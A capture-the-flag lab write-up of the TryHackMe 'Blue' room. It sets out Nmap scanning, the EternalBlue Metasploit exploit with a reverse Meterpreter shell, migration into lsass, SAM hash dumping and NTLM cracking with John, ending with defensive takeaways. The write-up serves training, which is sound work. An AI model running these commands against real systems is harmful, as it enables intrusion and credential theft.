# TryHackMe — Blue

**Difficulty:** Easy  
**Category:** Windows Exploitation  
**Vulnerabilities:** EternalBlue (MS17-010)  
**Tools Used:** Nmap, Metasploit, John the Ripper  
**Target OS:** Windows Server 2012 R2 Datacenter  
**Result:** NT AUTHORITY\SYSTEM — full compromise  

---

## Room Overview

Blue is a beginner-friendly Windows exploitation room on TryHackMe. The target machine is running a vulnerable version of Windows Server 2012 R2 with SMB exposed on port 445. The objective is to exploit the EternalBlue vulnerability (MS17-010) to gain a shell, dump password hashes, crack them, and capture three flags across the filesystem.

---

## Methodology

### 1. Reconnaissance

Ran an Nmap scan to identify open ports and services:

```bash
nmap -sV 10.130.154.26
```

**Findings:**
- Port 135 — Microsoft RPC
- Port 139 — NetBIOS
- Port 445 — SMB (microsoft-ds)
- Port 3389 — RDP
- OS: Windows Server 2012 R2 Datacenter 9600 x64

Ports under 1000 that were open: **3** (135, 139, 445)

Confirmed MS17-010 vulnerability:

```bash
nmap --script smb-vuln-ms17-010 10.130.154.26
```

**Result:** Host confirmed vulnerable to EternalBlue (MS17-010)

---

### 2. Exploitation

Launched Metasploit and selected the EternalBlue exploit module:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.130.154.26
set LHOST 192.168.131.129
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

**Result:** Meterpreter session opened successfully

---

### 3. Post Exploitation

Checked current user and system info:

```bash
getuid
# Server username: NT AUTHORITY\SYSTEM

sysinfo
# Computer: WIN-JO6REVNMMMP
# OS: Windows Server 2012 R2 (6.3 Build 9600)
# Architecture: x64
# Meterpreter: x86/windows
```

Already running as SYSTEM — no privilege escalation needed.

**Process Migration:**
Meterpreter was running as x86 but the machine is x64. Migrated to lsass.exe (PID 496) for a stable 64-bit session:

```bash
ps
migrate 496
```

---

### 4. Password Hash Dumping

Dumped password hashes from the SAM database:

```bash
hashdump
```

**Output:**



---

### 5. Hash Cracking

Cracked Jon's NTLM hash using John the Ripper and the rockyou.txt wordlist:

```bash
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result:** Password cracked in 1 second
**Jon's password:** `alqfna22`

---

### 6. Flag Collection

Searched the filesystem for flags:

```bash
search -f flag*.txt
```

**Flag 1** — System root:

**Flag 2** — SAM database location:

**Flag 3** — Administrator documents:


---

## Key Takeaways

- EternalBlue exploits a buffer overflow in SMBv1 — SMBv1 should always be disabled on Windows systems
- MS17-010 was the same vulnerability used by WannaCry ransomware in May 2017
- The exploit gave SYSTEM privileges immediately — no separate escalation step needed
- NTLM hashes can be cracked offline with a wordlist — weak passwords fall in seconds
- Process migration from x86 to x64 is necessary when architecture mismatches occur
- The SAM database at `C:\Windows\System32\config\` contains all Windows password hashes

---

## What I Learned

- How to use Nmap to identify vulnerable services
- How EternalBlue works at a conceptual level
- How to use Metasploit end to end — select module, set options, run exploit
- How to navigate a Meterpreter session
- How to dump and crack NTLM password hashes
- The importance of process migration for stable sessions
- Where sensitive data lives on a Windows machine

---

## References

- [MS17-010 CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
- [TryHackMe Blue Room](https://tryhackme.com/room/blue)
- [EternalBlue Metasploit Module](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)